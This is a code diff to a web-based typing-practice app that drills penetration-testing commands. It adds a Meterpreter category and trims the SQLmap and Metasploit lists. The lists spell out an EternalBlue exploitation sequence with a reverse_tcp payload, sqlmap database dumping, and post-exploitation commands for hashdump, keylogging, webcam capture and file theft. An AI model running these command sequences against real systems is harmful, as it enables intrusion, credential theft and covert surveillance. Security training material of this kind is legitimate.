@@ -15,7 +15,7 @@ body{
   margin:0;
 }
 .app{
-  width:800px;
+  width:820px;
   background:#111;
   padding:25px;
   border-radius:14px;
@@ -60,6 +60,7 @@ select,button,input{
   <option value="nmap">Nmap</option>
   <option value="sqlmap">SQLmap</option>
   <option value="metasploit">Metasploit</option>
+  <option value="meterpreter">Meterpreter</option>
 </select>
 
 <button id="skipBtn">Skip</button>
@@ -99,42 +100,43 @@ sqlmap:[
   "sqlmap -u http://site.com/index.php?id=1 --risk=3 --level=5",
   "sqlmap -r request.txt",
   "sqlmap -r request.txt --dbs",
-  "sqlmap -r request.txt --dump",
-  "sqlmap --tamper=space2comment -u http://site.com/index.php?id=1"
+  "sqlmap -r request.txt --dump"
 ],
 
 metasploit:[
   "msfconsole",
-  "help",
   "search smb",
   "use exploit/windows/smb/ms17_010_eternalblue",
-  "info",
   "show options",
-  "show payloads",
   "set RHOSTS 192.168.1.10",
-  "set RPORT 445",
   "set LHOST 192.168.1.5",
-  "set LPORT 4444",
   "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
   "exploit",
-  "run",
   "sessions",
-  "sessions -i 1",
-  "background",
+  "sessions -i 1"
+],
+
+meterpreter:[
   "sysinfo",
   "getuid",
   "ps",
   "shell",
   "pwd",
   "ls",
+  "cd ..",
   "upload file.txt",
   "download secret.txt",
   "screenshot",
-  "hashdump"
+  "webcam_snap",
+  "keyscan_start",
+  "keyscan_dump",
+  "keyscan_stop",
+  "hashdump",
+  "background"
 ]
 };
 
-/* ===== CORE LOGIC (stable + locked) ===== */
+/* ===== CORE LOGIC (locked) ===== */
 let target="", typed="";
 let done=0, total=15, errors=0;
 let locked=false;
